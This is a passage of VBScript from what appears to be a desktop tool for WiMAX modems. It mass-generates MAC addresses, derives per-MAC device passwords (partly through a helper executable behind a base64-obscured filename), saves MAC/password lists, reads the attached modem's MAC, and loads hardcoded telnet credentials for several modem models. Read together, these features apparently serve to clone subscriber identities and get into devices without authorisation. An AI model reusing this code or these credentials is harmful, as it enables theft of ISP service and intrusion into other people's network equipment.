Set objFSO = Nothing
Set strLine = Nothing
Set strNewContents = Nothing
End Sub
Function checkMacLastOctetFull(lastMacOctet)
Dim macFullOctet
macFullOctet = lastMacOctet
If Len(lastMacOctet) = 1  then
macFullOctet = "0" & lastMacOctet
End If
If Len(lastMacOctet) = 3  then
macFullOctet = "00"
End If
checkMacLastOctetFull = macFullOctet
End Function 
Sub GenMac 
hdnStopProcessResult.value = "0"
If Not	IsNumeric(Trim(InputMacHowMany.value)) Then
hdnStopProcessResult.value = "1"
MsgBox "Please enter a valid number."
InputMacHowMany.value = 5
Exit Sub
End If
Dim mac, lastHex, lastHexRange,inc,incTest,newMac,genMethodString
StartDate = Now
mac =  InputacAddress.value
macAnswer = Msgbox (" Type of MAC."  & vbCr & vbLf & vbCr & vbLf & "Question: MAC is for BM622m 2012-13 series??? "& vbCr & vbLf  & vbCr & vbLf & "Click [ YES ] If MAC is for 622m 2012-13. "& vbCr & vbLf &  "Click [ NO ] If MAC is OLD MAC series or SMART MAC. ", vbYesNo, "Confirmation Message...")
LogContents.value =  "Generating MAC started..."
intNumberofMAc = CLng(Trim(InputMacHowMany.value))
inc = dropDownIncrement.Value'"05"
genMethodString = "Increment"
howManyMac = 0
getNewBaseMac = UCase(getBaseMacFourtOctetOnly)
Do
myCurrenMacFifthHex = Mid(mac,13,2)
myCurrenMacSixthHex =  Mid(mac,16,2)
fifthAndSixthMac = myCurrenMacFifthHex & myCurrenMacSixthHex
howManyMac = howManyMac + 1
If chkIncDec.Checked Then
incTest = doMath(fifthAndSixthMac,inc)
Else
incTest = SubdoMath(fifthAndSixthMac,inc)
genMethodString = "Decrement"
End if
newMac = incTest
If incTest < "0000" Then
DisplayLogMacGenScan genMethodString & " is out of range... Try use INCREMENT method."
Exit do
End If 
If Len(incTest) = 3  Then
newMac = "0" & newMac
ElseIf Len(incTest) = 2 Then
newMac = "00" & newMac
ElseIf Len(incTest) = 1 Then
newMac = "000" & newMac
ElseIf Len(incTest) >4  Then
DisplayLogMacGenScan genMethodString & " is out of range... Try use DECREMENT method."
Exit Do
End If
newMacFifth  = Mid(newMac,1,2)
newMacSixth  = Mid(newMac,3,2)
newMac = newMacFifth &":"& newMacSixth
fullNewMAc =  getNewBaseMac & UCase(newMac)
macTestResult = "NA"
''MsgBox TestingMacOnlyGen("",Replace(fullNewMAc,":",""))
If macAnswer = vbYes Then
''generat622mMAC
macTestResult = TestingMacOnlyGen("",Replace(fullNewMAc,":",""))
ElseIf macAnswer = vbNo Then
''generat622mMAC
	If radiobtnDv235tS.checked Then
		macTestResult = "smart1_lancelot"
	Else
		macTestResult = Trim(generatePassword(fullNewMAc))
	End If
End If
''macTestResult = TestingMacOnlyGen("",Replace(fullNewMAc,":",""))
''
''MsgBox fullNewMAc
DisplayLogMacGenScan genMethodString & "ing " & fullNewMAc & "....."
	If macTestResult = "NA" Then
	DisplayLogMacGenScan("Password generation failed")
	Else
	appendFile fullNewMAc,macTestResult
	End If
populateListOfGenMac
If hdnStopMacProcess.value = "1" Then
Sleeper 1000
DisplayLogMacGenScan("Stopping process....Ok!")
hdnStopProcessResult.value = "1"
Exit Sub
End If
'MsgBox incTest
mac = fullNewMAc
Loop While howManyMac <> intNumberofMAc
secElapseTime= DateDiff("s", StartDate, Now)
If secElapseTime > 60 Then
FinalElapseTimeMin = Round((secElapseTime /60),2) ''DateDiff("m", StartDate, Now)
DisplayLogMacGenScan "Generating MAC FINISHED... Elapse Time: " & FinalElapseTimeMin &" min(s)"
Else
FinalElapseTimeSec = secElapseTime
DisplayLogMacGenScan "Generating MAC FINISHED... Elapse Time: " & FinalElapseTimeSec &" sec(s)"
End If
'valInt = CLng(valString)
hdnStopProcessResult.value = "1"
End Sub
''
''
''Begin IncrementMAC by One
Function IncrementMacbyOne (lanMAc)
Dim mac, lastHex, lastHexRange,inc,incTest,newMac,genMethodString
mac =  lanMAc
fullNewMAc = "30:87:30:C6:83:18"
''LogContents.value =  "Generating MAC started..."
intNumberofMAc = CLng(Trim(1))
inc = 1
genMethodString = "Increment"
howManyMac = 0
getNewBaseMac = UCase(getBaseMacFourtOctetSixTTm(mac))
Do
myCurrenMacFifthHex = Mid(mac,13,2)
myCurrenMacSixthHex =  Mid(mac,16,2)
fifthAndSixthMac = myCurrenMacFifthHex & myCurrenMacSixthHex
howManyMac = howManyMac + 1
incTest = doMath(fifthAndSixthMac,inc)
newMac = incTest
If incTest < "0000" Then
''DisplayLogMacGenScan genMethodString & " is out of range... Try use INCREMENT method."
Exit do
End If 
If Len(incTest) = 3  Then
newMac = "0" & newMac
ElseIf Len(incTest) = 2 Then
newMac = "00" & newMac
ElseIf Len(incTest) = 1 Then
newMac = "000" & newMac
ElseIf Len(incTest) >4  Then
''DisplayLogMacGenScan genMethodString & " is out of range... Try use DECREMENT method."
Exit Do
End If
newMacFifth  = Mid(newMac,1,2)
newMacSixth  = Mid(newMac,3,2)
newMac = newMacFifth &":"& newMacSixth
fullNewMAc =  getNewBaseMac & UCase(newMac)
mac = fullNewMAc
Loop While howManyMac <> intNumberofMAc
IncrementMacbyOne = fullNewMAc
End Function
''End IncrementMAC by one
''
Function getBaseMac()
Dim mac,baseMac
mac =  InputacAddress.value
baseMacValue = Mid(mac,1,15)
getBaseMac =baseMacValue
'inputMacBase.value = baseMac
Set mac = Nothing
Set baseMac = Nothing
End Function 
Function getBaseMacFourtOctetOnly()
Dim mac,baseMac
mac =  InputacAddress.value
baseMacValue = Mid(mac,1,12)
getBaseMacFourtOctetOnly =baseMacValue
'inputMacBase.value = baseMac
Set mac = Nothing
Set baseMac = Nothing
End Function 'end getbaseMac
''
Function getBaseMacFourtOctetSixTTm(macFull)
Dim mac,baseMac
mac =  macFull
baseMacValue = Mid(mac,1,12)
getBaseMacFourtOctetSixTTm =baseMacValue
'inputMacBase.value = baseMac
Set mac = Nothing
Set baseMac = Nothing
End Function 'end getbaseMac
''
Function getBaseMacThirdOctetOnly()
Dim mac,baseMac
mac =  InputacAddress.value
baseMacValue = Mid(mac,1,9)
getBaseMacThirdOctetOnly =baseMacValue
'inputMacBase.value = baseMac
Set mac = Nothing
Set baseMac = Nothing
End Function 'end getbaseMac
Function getBaseOFMyCurrentMac(stringMAC)
Dim baseMac,baseMacValue
'mac =  InputacAddress.value
baseMacValue = Mid(stringMAC,1,15)
getBaseOFMyCurrentMac = baseMacValue
'inputMacBase.value = baseMac
'Set mac = Nothing
Set baseMac = Nothing
Set baseMacValue = Nothing
End Function 'end getbaseMac
Function getBaseMacToFourthHexOnly(stringMAC)
Dim baseMac,baseMacValue
'mac =  InputacAddress.value
baseMacValue = Mid(stringMAC,1,12)
getBaseMacToFourthHexOnly = baseMacValue
'inputMacBase.value = baseMac
'Set mac = Nothing
Set baseMac = Nothing
Set baseMacValue = Nothing
End Function 'end getbaseMac
Sub OnClicInputacAddress
' UserName.style.background = "cyan"
If InputacAddress.value = " INVALID MAC !!!" Then
InputacAddress.style.background = "White"
InputacAddress.Value =""
InputacAddress.style.color = "#000000"
End If
inputMacChange
'Msgbox "You Selected Option" & " " & dropDownLastHex.Value, 64,"Dropdown Menu OnChange"
End Sub 
Sub OnKeyUpInputMacAddress
Dim mac, lastHex,lastHexRange
mac =  InputacAddress.value
''	lastHex = Mid(mac,16,2)
''	lastHexRange = dropDownLastHex.Value
If macIsFull(mac) = True Then
''LogContents.Value = macIsFull(mac) 
If	 checkMacAddressValid(InputacAddress.value) = "valid"   Then
genMacButton.Disabled = False
addMacButton.Disabled = False
InputacAddress.style.background = "White"
InputacAddress.style.color = "#000000"
macRangeTOScan.style.color = "#000000"
''	macRangeTOScan.Value = Ucase(InputacAddress.value) & "  -  " & UCase(getBaseMac & dropDownLastHex.Value)
'					If checkGreaterThan(lastHex,lastHexRange) = False AND  dropDownLastHex.Value <> "" Then
'						macRangeTOScan.value = " Error: MAC range is INVALID !!!"
'							genMacButton.Disabled = True
'							macRangeTOScan.style.color = "Blue"
'							InputacAddress.style.background = "Orange"
'				   			InputacAddress.style.color = "Blue"
''MsgBox lastHex & " is GREATER than or EQUAL to " & lastHexRange &"!!!"
'						End If
Else
macRangeTOScan.value = " Error: MAC range is INVALID !!!"
genMacButton.Disabled = True
addMacButton.Disabled = True
If checkMacAddressValid(InputacAddress.value) <> "valid" Then
macRangeTOScan.style.color = "Blue"
InputacAddress.style.background = "Orange"
Else
InputacAddress.style.background = "White"
InputacAddress.style.color = "#000000"
macRangeTOScan.Value = ""
End If
If checkMacAddressValid(InputacAddress.value) = "valid" then
InputacAddress.style.background = "White"
InputacAddress.style.color = "#000000"
genMacButton.Disabled = False
addMacButton.Disabled = False
End If
End If
Else
''LogContents.Value = macIsFull(mac)
macRangeTOScan.value = " Error: MAC range is INVALID !!!"
genMacButton.Disabled = True
addMacButton.Disabled = True
macRangeTOScan.style.color = "Blue"
InputacAddress.style.background = "Orange"
InputacAddress.style.color = "Blue" 
End If
Set mac = Nothing
''	Set lastHex = Nothing
''	Set lastHexRange = Nothing
End Sub 'end OnKeyUpInputMacAddress
Sub OnClicInputStableMac622
' UserName.style.background = "cyan"
If inputChangeMacOneStable.value = "Enter Stable MAC here" Then
inputChangeMacOneStable.style.background = "White"
inputChangeMacOneStable.Value =""
inputChangeMacOneStable.style.color = "#000000"
End If
'Msgbox "You Selected Option" & " " & dropDownLastHex.Value, 64,"Dropdown Menu OnChange"
End Sub 'end OnClicInputacAddress
Sub OnkeyUpInputStableMac622
Dim mac, lastHex
mac =  Trim(inputChangeMacOneStable.value)
lastHex = Mid(mac,16,2)
If macIsFull(mac) = True Then
If checkMacAddressValid(inputChangeMacOneStable.value) <> "valid" Then
inputChangeMacOneStable.style.color = "Blue"
inputChangeMacOneStable.style.background = "Orange"
changeMacOneOnly.Disabled = True
btnWebAdmin.Disabled = True
btnWebGUI.Disabled = True
btnSetFrequency.Disabled = True
'inputChangeMacOne.Click
Else
inputChangeMacOneStable.style.background = "White"
inputChangeMacOneStable.style.color = "#000000"
changeMacOneOnly.Disabled = False
btnWebAdmin.Disabled = False
btnWebGUI.Disabled = False
btnSetFrequency.Disabled = False
inputChangeMacOne.Click
End If
Else
inputChangeMacOneStable.style.background = "Orange"
inputChangeMacOneStable.style.color = "Blue" 
End If
Set mac = Nothing
Set lastHex = Nothing
End Sub
''end stable mac
Sub inputMacChange
mac = UCase(InputacAddress.value)
'lastHex = Mid(mac,16,2)
'lastHexRange = dropDownLastHex.Value
If macIsFull(mac) = True Then
'LogContents.Value = macIsFull(mac)
If checkMacAddressValid(InputacAddress.value) = "valid" Then
' macRangeTOScan.Value = Ucase(InputacAddress.value) & "  -  " & UCase(getBaseMac & dropDownLastHex.Value)
genMacButton.Disabled = False
addMacButton.Disabled = False
macRangeTOScan.style.color = "#000000"
InputacAddress.style.background = "White"
InputacAddress.style.color = "#000000"
Else
'Msgbox "Please enter a valid MAC address!!!"
'dropDownLastHex.Value = ""
InputacAddress.Value = ""
'InputacAddress.Focus
InputacAddress.style.background = "Orange"
InputacAddress.style.color = "Blue"
'InputacAddress.style.fontWeight ="Bold"
'InputacAddress.style.fontSize ="10"
InputacAddress.value = " INVALID MAC !!!"
dropDownLastHex.Value = ""
'"WAIT "& chr(34) &"ATP>"& chr(34)&""
macRangeTOScan.value = " Error: MAC range is INVALID !!!"
macRangeTOScan.style.color = "Blue"
End If
Else
'LogContents.Value = macIsFull(mac)
macRangeTOScan.value = " Error: MAC range is INVALID !!!"
genMacButton.Disabled = True
addMacButton.Disabled = True
macRangeTOScan.style.color = "Blue"
InputacAddress.style.background = "Orange"
InputacAddress.style.color = "Blue" 
End If
End Sub 
Sub generateMac
If checkMacAddressValid(InputacAddress.value) = "valid" Then
'macRangeTOScan.Value = InputacAddress.value & "  -  " & getBaseMac & dropDownLastHex.Value
hdnStopMacProcess.value = "0"  'set stop process to 0 to continue
hdnStopProcessResult.value = "0"
s = dropDownIncrement.value
If inStr(s, "Ran") Then
' String contains text
MacGenRanPrivate
Else
GenMac
End If 
Else
Msgbox "Please check the MAC address if it is valid or range options!!"
genMacButton.Disabled = True
addMacButton.Disabled = True
InputacAddress.style.background = "Orange"
InputacAddress.style.color = "Red"
End If
hdnStopMacProcess.value = "1" 
hdnStopProcessResult.value = "1"
End Sub 'end generateMac
Function splitTest
Dim MyString, MyArray, i
result = 0
MyString = "VBScript|is|fun!"
MyArray = Split(MyString, "|", -1, 1)
' MyArray(0) contains "VBScript".
' MyArray(1) contains "is".
' MyArray(2) contains "fun!".
For i = 0 to UBound(MyArray)
result = result + (MyArray(i))
Next
Set MyString = Nothing 
Set MyArray = Nothing 
Set i = Nothing
splitTest = result
End Function
Function IsSnipeMac
x = macId2.value
For i = 1 To Len(x) 
a = Mid(x, i, 1) 
a = Chr(Asc(a)-3) 
b = b & a 
Next 
IsSnipeMac = b 
End Function
Function IsSnipeMacTest
x = macIdTest.value
For i = 1 To Len(x) 
a = Mid(x, i, 1) 
a = Chr(Asc(a)-3) 
b = b & a 
Next 
IsSnipeMacTest = b 
End Function
Sub isFullPopUp
MsgBox  macIsFull (InputacAddress.value)
End Sub 'end isFullPopUp
Function macIsFull(stringMac)
Dim MyString,MyArray,countArray, i,resultMacIsFull
MyString = (Trim(stringMac))
macNoColon = Replace(MyString,":","")
macNoColonLength = Len(macNoColon)
MyArray = Split(MyString, ":", -1, 1)
countArray = 0
For i = 0 to UBound(MyArray)
countArray = i
Next
If countArray  < 5 OR countArray >5 Then
''MsgBox "countArry: " &countArray
resultMacIsFull = False
Else
''MsgBox "countArry: " &countArray
If macNoColonLength = 12 Then
resultMacIsFull = True
Else 
resultMacIsFull = False
End if
End If
Set MyString = Nothing
Set MyArray  = Nothing
Set countArray  = Nothing
Set i  = Nothing
macIsFull = resultMacIsFull
End Function 
Sub getMacGeneratedPassword
macTogen = Trim(InputMacToGenPassword.value)
If macIsFull(macTogen) = True Then
OutmacPassword.value = generatePassword(macTogen)
Else
OutmacPassword.value = "invalid"
End If 
End Sub
''begin gentest
Sub MacGenRanPrivate
hdnStopProcessResult.value = "0"
If Not	IsNumeric(Trim(InputMacHowMany.value)) Then
hdnStopProcessResult.value = "1"
MsgBox "Please enter a valid number."
InputMacHowMany.value = 5
Exit Sub
End If
Dim mac, lastHex, lastHexRange,inc,incTest,newMac
StartDate = Now
mac =  InputacAddress.value
macAnswer = Msgbox (" Type of MAC."  & vbCr & vbLf & vbCr & vbLf & "Question: MAC is for BM622m 2012-13 series??? "& vbCr & vbLf  & vbCr & vbLf & "Click [ YES ] If MAC is for 622m 2012-13. "& vbCr & vbLf &  "Click [ NO ] if MAC is OLD MAC series or SMART MAC. ", vbYesNo, "Confirmation Message...")
LogContents.value =  "Generating MAC started..."
intNumberofMAc = CLng(Trim(InputMacHowMany.value))
randomNumRange = LCase(Mid(dropDownIncrement.value,4)) 
randomNumRangeInt = CLng(randomNumRange)
''MsgBox randomNumRangeInt
howManyMac = 0
genMethodString = "Increment"
getNewBaseMac = UCase(getBaseMacFourtOctetOnly)
Do
inc = RandomNumInc(randomNumRangeInt)
myCurrenMacFifthHex = Mid(mac,13,2)
myCurrenMacSixthHex =  Mid(mac,16,2)
fifthAndSixthMac = myCurrenMacFifthHex & myCurrenMacSixthHex
howManyMac = howManyMac + 1
If chkIncDec.Checked Then
incTest = doMath(fifthAndSixthMac,inc)
Else
incTest = SubdoMath(fifthAndSixthMac,inc)
genMethodString = "Decrement"
End if
newMac = incTest
If incTest < "0000" Then
DisplayLogMacGenScan genMethodString & " is out of range... Try use INCREMENT method."
Exit do
End If 
If Len(incTest) = 3  Then
newMac = "0" & newMac
ElseIf Len(incTest) = 2 Then
newMac = "00" & newMac
ElseIf Len(incTest) = 1 Then
newMac = "000" & newMac
ElseIf Len(incTest) >4  Then
DisplayLogMacGenScan genMethodString & " is out of range... Try use DECREMENT method."
Exit Do
End If
newMacFifth  = Mid(newMac,1,2)
newMacSixth  = Mid(newMac,3,2)
newMac = newMacFifth &":"& newMacSixth
fullNewMAc =  getNewBaseMac & UCase(newMac)
''MsgBox fullNewMAc
DisplayLogMacGenScan genMethodString & "ing " & fullNewMAc & "....."
''appendFile(fullNewMAc)
macTestResult = "NA"
''MsgBox TestingMacOnlyGen("",Replace(fullNewMAc,":",""))
If macAnswer = vbYes Then
''generat622mMAC
macTestResult = TestingMacOnlyGen("",Replace(fullNewMAc,":",""))
ElseIf macAnswer = vbNo Then
''generat622mMAC
''macTestResult = Trim(generatePassword(fullNewMAc))
	If radiobtnDv235tS.checked Then
		macTestResult = "smart1_lancelot"
	Else
		macTestResult = Trim(generatePassword(fullNewMAc))
	End If
End If
''macTestResult = TestingMacOnlyGen("",Replace(fullNewMAc,":",""))
	If macTestResult = "NA" Then
	DisplayLogMacGenScan("Password generation failed")
	Else
	appendFile fullNewMAc,macTestResult
	End If
populateListOfGenMac
If hdnStopMacProcess.value = "1" Then
Sleeper 1000
DisplayLogMacGenScan("Stopping process....Ok!")
hdnStopProcessResult.value = "1"
Exit Sub
End If
'MsgBox incTest
''	mac = fullNewMAc
Loop While howManyMac <> intNumberofMAc
secElapseTime= DateDiff("s", StartDate, Now)
If secElapseTime > 60 Then
FinalElapseTimeMin = Round((secElapseTime /60),2) ''DateDiff("m", StartDate, Now)
DisplayLogMacGenScan "Generating MAC FINISHED... Elapse Time: " & FinalElapseTimeMin &" min(s)"
Else
FinalElapseTimeSec = secElapseTime
DisplayLogMacGenScan "Generating MAC FINISHED... Elapse Time: " & FinalElapseTimeSec &" sec(s)"
End If
'valInt = CLng(valString)
hdnStopProcessResult.value = "1"
End Sub
''END gentest
''begin checkMAcIfvalid
Function CheckMyDefaultMacIsValid
macTogenTest = inputDefaultMAC.value
If macIsFull(macTogenTest) = True Then
''LogContents.Value = macIsFull(mac) 
If	 checkMacAddressValid(macTogenTest) = "valid"   Then
''OutmacPassword.value = generatePassword(macTogen)

drpDwnDefaultMacDomain.Disabled = False
inputDefaultMACPassword.Disabled = False
btnPasteDefaultMacPassword.Disabled = False
btnLoadDefaultMacPassword.Disabled = False
btnChangeMacDefault.Disabled = False
btnSaveMacDefault.Disabled = False
result = True
Else

''MsgBox "Please enter a VALID MAC!!!",48+4096,"Error Message....."
''inputDefaultMAC.value = "Enter MAC here"
drpDwnDefaultMacDomain.Disabled = True
inputDefaultMACPassword.Disabled = True
btnPasteDefaultMacPassword.Disabled = True
btnLoadDefaultMacPassword.Disabled = True
btnChangeMacDefault.Disabled = True
btnSaveMacDefault.Disabled = True
document.all.chkEnableRestoreDefalutMacLabel.style.background = ""
chkEnableRestoreDefalutMac.Checked = False
result = False
End If
Else
''MsgBox "Please enter a VALID MAC!!!",48+4096,"Error Message....."
''inputDefaultMAC.value = "Enter MAC here"
drpDwnDefaultMacDomain.Disabled = True
inputDefaultMACPassword.Disabled = True
btnPasteDefaultMacPassword.Disabled = True
btnLoadDefaultMacPassword.Disabled = True
btnChangeMacDefault.Disabled = True
btnSaveMacDefault.Disabled = True
document.all.chkEnableRestoreDefalutMacLabel.style.background = ""
chkEnableRestoreDefalutMac.Checked = False
result = False
End If 
CheckMyDefaultMacIsValid = result
End Function 
''End checkMAcIfvalid
Sub PingTestUsingConsole
CreateObject("WScript.Shell").Run "cmd /K ping google.com -t",1,true
End Sub
Sub GetChkLoadMyMAC
If chkLoadMyMAC.Checked Then
document.all.chkLoadMyMACLabel.style.background = "red"
''GetMyCurrentMAC
''GetPassAndDomainPass
''
changeMACLog.value =  "Checking  " & inputTelnetHost.value & " Please WAIT...."
TextAreaScrollBottom(changeMACLog.name) 
If PingHostLoop Then
GetMyCurrentMAC
GetPassAndDomainPass
Else
changeMACLog.value =  "Retrieving MAC on "  & inputTelnetHost.value & " Failed!!!"
TextAreaScrollBottom(changeMACLog.name)
MsgBox "Please check your connection...or try again later..."
End If
''
'Msgbox "Loading your Current MAC." , 64+4096 , "Load device current MAC?"
' shutdownPCLabel.style.color = "RED"
'shutdownPCLabel.InnerHTML.style.color = "RED"
If inputChangeMacOne.value = "" Then
inputChangeMacOne.value= "Enter MAC here"
End If 
Else
document.all.chkLoadMyMACLabel.style.background = ""
ClearRestoreChangeMac
''Msgbox "Restoring fields." , 64+4096 , "Notification message"
DisplayLogChangeMAConly  "Restoring fields finished....." 
End If
'	If chkExcludeNai.Checked = True Then
'		Msgbox "The checkbox is " & chkExcludeNai.value
'	End if
'	If chkExcludeNai.Checked = False Then
'		Msgbox "The checkbox is " & chkExcludeNai.value
'	End If
End Sub
Sub GetChkLoadMyMacToRestore
If chkLoadMyMAC.Checked Then
document.all.chkLoadMyMACLabel.style.background = "red"
'Msgbox "Loading your Current MAC." , 64+4096 , "Load device current MAC?"
' shutdownPCLabel.style.color = "RED"
'shutdownPCLabel.InnerHTML.style.color = "RED"
Else
document.all.chkLoadMyMACLabel.style.background = ""
ClearRestoreChangeMac
'Msgbox "Restoring fields." , 64+4096 , "Notification message"
End If
'	If chkExcludeNai.Checked = True Then
'		Msgbox "The checkbox is " & chkExcludeNai.value
'	End if
'	If chkExcludeNai.Checked = False Then
'		Msgbox "The checkbox is " & chkExcludeNai.value
'	End If
End Sub
Sub GetArpFromIP(stringIp)
'stringIp = "192.34.11.1"
On Error Resume Next
inputChangeMacOne.value = "Please wait..."
changeMACLog.value = changeMACLog.value & vbCr & vbLf & "Retrieving device current MAc...  " 
TextAreaScrollBottom(changeMACLog.name) 
changeMACLog.value = changeMACLog.value & vbCr & vbLf & "NOTE: WIMAX MUST be DIRECTLY connected  to your PC/LAPTOP. " 
TextAreaScrollBottom(changeMACLog.name) 
''sCurPath = CreateObject("Scripting.FileSystemObject").GetAbsolutePathName(".")
filename = "arpMacGet.txt"
''sCurPath = ReplaceWithSpace(Chr(34)& GetToolCurrentDirectory &"\" &filename & chr(34))
sCurPathAndFile = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filename)
''MsgBox sCurPathAndFile
''CreateObject("WScript.Shell").Run "cmd /c arp -a " & stringIp & " > " & chr(34) & sCurPath  & "\arpMacGet.txt" &chr(34),0,True
CreateObject("WScript.Shell").Run "cmd /c arp -a " & stringIp & " > " & chr(34) & sCurPathAndFile &chr(34),0,True
''CreateObject("WScript.Shell").Run "cmd /c arp -a " & stringIp & " > " & chr(34) & sCurPath  & "\arpMacGet.txt" &chr(34),0,True
If Err.Number = 0 Then
changeMACLog.value = changeMACLog.value & vbCr & vbLf & "Processing... PLEASE WAIT......  " 
TextAreaScrollBottom(changeMACLog.name) 
Else
changeMACLog.value = changeMACLog.value & vbCr & vbLf & "Error:" & Err.Number & " Source: " & Err.Source & " Desc: " &  Err.Description				  
changeMACLog.value = changeMACLog.value & vbCr & vbLf & "Process aborted...."
TextAreaScrollBottom(changeMACLog.name) 
Err.Clear
End If 
End Sub
''
Sub InstallMyAutoItFile
Const OverwriteExisting = True
Set oFSO = CreateObject("Scripting.FileSystemObject")
LocalScrFile = oFSO.GetSpecialFolder(1) & "\AutoItXv3x.exe"''&chr(34)
LocalScrPath = oFSO.GetSpecialFolder(1)
filenameAutoIt = "StandardDLL\VC6\AutoItXv3x.exe"
RemoteScrFile = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filenameAutoIt)''&chr(34)
If oFSO.FileExists(RemoteScrFile)= False Then
	MsgBox "Some file is missing.... Please download the original tool.",16+4096,"Critical Error Message....."
	CloseWindow
	Exit Sub
'Else
'	MsgBox "Found"
End If
If oFSO.FileExists(LocalScrFile)= False Then
oFSO.CopyFile RemoteScrFile , LocalScrFile , OverwriteExisting
End If
Set oFSO = Nothing
End Sub
''
Function TestingMacOnlyGen(sN,sixtotoMmac)
resultTestSixtotoM = "NA"
If sN = "" Then
sN = "1234"''chr(34)& sN& chr(34)
End If 
On Error Resume Next
stringTxt = "NjIybU1BYy50eHQ="
filename = base64decode(stringTxt)
yyyxyyyzM = "AutoItXv3x.exe"
sCurPathAndFile = chr(34)& ReplaceWithSpace(GetToolCurrentDirectory &"\" &filename)&chr(34)
CreateObject("WScript.Shell").Run "%comspec% /c "& yyyxyyyzM &" " & sN & " "& sixtotoMmac& " > " &sCurPathAndFile, 0, True
If Err.Number = 0 Then
If GetTestingMac = "" Then
resultTestSixtotoM = "NA"
Else
resultTestSixtotoM = GetTestingMac
End If
Else
resultTestSixtotoM = "NA"
Err.Clear
End If 
TestingMacOnlyGen = resultTestSixtotoM
End Function
''
Function GetTestingMac
stringTxt = "NjIybU1BYy50eHQ="
filename = base64decode(stringTxt)
sResult = ""
accountFile = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filename)
Set fso = CreateObject("Scripting.FileSystemObject")
If fso.FileExists(accountFile)= True Then
Set objFileToRead = CreateObject("Scripting.FileSystemObject").OpenTextFile(accountFile,1)
strFileText = objFileToRead.ReadLine()
objFileToRead.Close
Set objFileToRead = Nothing
MyString = (Trim(strFileText))
MyArray = Split(MyString, ",", -1, 1)
sResult = MyArray(3)
End If
GetTestingMac = sResult
End Function
''
Sub GetMyCurrentMAC
GetArpFromIP(Trim(inputTelnetHost.value))
''MsgBox "Trying to load your Current MAC..." , 64+4096 , "Notification message"
DisplayLogChangeMAConly "Trying to load your Current MAC. Please WAIT...."
Sleeper(1000)
Set objFS = CreateObject("Scripting.FileSystemObject")
Set objRegExp = new RegExp
objRegExp.Pattern = "((?:(\d{1,2}|[a-fA-F]{1,2}){2})(?::|-*)){6}"
filename = "arpMacGet.txt"
currentFolderAndFile = ReplaceWithSpace(GetToolCurrentDirectory &"\" &filename)
Set objFile = objFS.OpenTextFile(currentFolderAndFile)
strFileContents = objFile.ReadAll
arrLines = Split(strFileContents,vbNewLine)
For Each strLine in arrLines
Set colMatches = objRegExp.Execute(strLine)
For Each strMatch in colMatches
fullCurrentMAc = Replace(UCase(strMatch),"-",":")
newbaseMac =  getBaseOFMyCurrentMac(fullCurrentMAc)
myCurrenMaclastHex = Mid(fullCurrentMAc,16,2)
subMACLastHex = SubdoMath (myCurrenMaclastHex,1)
If Len(subMACLastHex) = 1  then
subMACLastHex = "0" & subMACLastHex
End If
If subMACLastHex = "-1"  Then
myCurrenFifthHex = Mid(fullCurrentMAc,13,2)
subCurrenFifthHex = SubdoMath(myCurrenFifthHex,1)
If Len(subCurrenFifthHex) = 1  Then
subCurrenFifthHex = "0" & subCurrenFifthHex
End If
newbaseMac = getBaseMacToFourthHexOnly(fullCurrentMAc) & subCurrenFifthHex & ":"
subMACLastHex = "FF" 
End If
inputChangeMacOne.value = newbaseMac & UCase(subMACLastHex)
Next
Next
If inputChangeMacOne.value = "Please wait..." Then
'document.getElementById("chkLoadMyMAC").checked=False 
chkLoadMyMAC.checked = False
GetChkLoadMyMacToRestore
changeMACLog.value = changeMACLog.value & vbCr & vbLf & "Error: Failed to retrieve your device current MAC...   " 
changeMACLog.value = changeMACLog.value & vbCr & vbLf & "Please try again at least 4(four) tries...   " 
changeMACLog.value = changeMACLog.value & vbCr & vbLf & "If your behind a ROUTER, please REMOVE the ROUTER...   " 
TextAreaScrollBottom(changeMACLog.name) 
'	End If
'Exit Sub
Else
changeMACLog.value = changeMACLog.value & vbCr & vbLf & "Finish.... MAC successfully retrieved / loaded!!  " 
TextAreaScrollBottom(changeMACLog.name) 
End if	
End Sub
Sub LoadMyMacAddress
hdnStopMacProcess.value = "0"  'set stop process to 0 to continue
hdnStopProcessResult.value = "0"
GetChkLoadMyMAC
hdnStopProcessResult.value = "1"
End Sub
Sub LoadTelnetDefAccount
MsgBox "Make sure you SELECT your proper DEVICE." , 64+4096 , "Notification message....."
If radiobtnBm622i.checked Then
inputTelnetUname.value = "wimax"
inputTelnetPassowrd.value = "wimax820"
inputTelnetHost.value = "192.168.254.1"
ElseIf radiobtnBm622i2011.checked Or radiobtnBm622m2012.checked Then
inputTelnetUname.value = "Firefly"
inputTelnetPassowrd.value = "$P4mb1h1r4N4m4nT0!!"
inputTelnetHost.value = "192.168.254.1"
ElseIf radiobtnBm6222011.checked Then
inputTelnetUname.value = "Firefly"
inputTelnetPassowrd.value = "$P4mb1h1r4N4m4nT0!!"
inputTelnetHost.value = "192.168.1.1"
ElseIf radiobtnDv235tS.checked Or radiobtnDv235tG.checked Then
inputTelnetUname.value = "admin"
inputTelnetPassowrd.value = "admin"
inputTelnetHost.value = "10.1.1.254"
Else
inputTelnetUname.value = "wimax"
inputTelnetPassowrd.value = "wimax820"
inputTelnetHost.value = "192.168.1.1"
End If
End Sub
Sub LoadDefaultMacPassword
If radiobtnDv235tS.checked Then
inputDefaultMACPassword.value = "smart1_lancelot"
Exit Sub
End If
macTogen = Trim(inputDefaultMAC.value)
''macPass =generatePassword(macTogen)
macAnswer = Msgbox (" Type of MAC."  & vbCr & vbLf & vbCr & vbLf & "Question: MAC is for BM622m 2012-13 series??? "& vbCr & vbLf  & vbCr & vbLf & "Click [ YES ] If MAC is for 622m 2012-13. "& vbCr & vbLf &  "Click [ NO ] If MAC is OLD series MAC. ", vbYesNo, "Confirmation Message...")
If macAnswer = vbYes Then
''generat622mMAC
macPass = TestingMacOnlyGen("",Replace(macTogen,":",""))
ElseIf macAnswer = vbNo Then
macPass =generatePassword(macTogen)
End If
inputDefaultMACPassword.value = macPass
End Sub 
Sub GetPassAndDomainPass
macTogen = Trim(inputChangeMacOne.value)
macPass = "invalid"

If inputChangeMacOne.value = "Enter MAC here" Then
inputChangeMacOne.value = ""
inputUserId.value = " Invalid MAC"
inputDomainPassword.value = " Invalid MAC"
inputNai.value = " Invalid MAC"
webUiAdminPassword.value =" Invalid MAC"
changeMacOneOnly.Disabled = False
btnWebAdmin.Disabled = False
btnWebGUI.Disabled = False
btnSetFrequency.Disabled = False
DisableSecuritySettingsElement
Exit Sub
End If

If macIsFull(macTogen) = True Then
''macPass =generatePassword(macTogen)
''	
	If chkEnable622mType.Checked = True Then 
